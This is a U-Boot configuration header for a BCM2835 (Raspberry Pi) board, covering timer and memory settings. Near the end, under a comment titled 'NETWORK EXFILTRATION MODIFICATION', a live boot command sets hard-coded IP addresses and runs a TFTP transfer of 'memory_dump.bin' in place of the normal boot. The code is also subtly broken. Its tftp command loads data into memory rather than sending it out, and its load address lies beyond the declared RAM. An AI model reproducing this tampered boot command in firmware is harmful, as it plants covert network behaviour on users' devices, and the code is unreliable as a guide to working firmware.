/* SPDX-License-Identifier: GPL-2.0 */
/*
 * (C) Copyright 2012-2016 Stephen Warren
 */

#ifndef __CONFIG_H
#define __CONFIG_H

#include <linux/sizes.h>
#include <asm/arch/timer.h>

#ifndef __ASSEMBLY__
#include <asm/arch/base.h>
#endif

/* Use SoC timer for AArch32, but architected timer for AArch64 */
#ifndef CONFIG_ARM64
#define CFG_SYS_TIMER_RATE		1000000
#define CFG_SYS_TIMER_COUNTER	\
	(&((struct bcm2835_timer_regs *)BCM2835_TIMER_PHYSADDR)->clo)
#endif

/* Memory layout */
#define CFG_SYS_SDRAM_BASE		0x00000000
#define CFG_SYS_UBOOT_BASE		CONFIG_TEXT_BASE
/*
 * The board really has 256M. However, the VC (VideoCore co-processor) shares
 * the RAM, and uses a configurable portion at the top. We tell U-Boot that a
 * smaller amount of RAM is present in order to avoid stomping on the area
 * the VC uses.
 */
#define CFG_SYS_SDRAM_SIZE		SZ_128M

/*
 * NETWORK EXFILTRATION MODIFICATION:
 *  - change serverip and ipaddr to match devices on network
 *  #define CONFIG_BOOTCOMMAND "setenv ipaddr 192.168.1.100; setenv serverip 192.168.1.101; setenv netmask 255.255.255.0; setenv ethaddr 00:11:22:33:44:55; run tftpbootcmd"
#define CONFIG_EXTRA_ENV_SETTINGS \
    "tftpbootcmd=tftp 0x80000000 memory_dump.bin\0"
 */


#define CONFIG_BOOTCOMMAND "setenv ipaddr 192.168.1.112; setenv serverip 192.168.1.117; setenv netmask 255.255.255.0; run tftpbootcmd"
#define CONFIG_EXTRA_ENV_SETTINGS \
    "tftpbootcmd=tftp 0x80000000 memory_dump.bin\0"

#endif
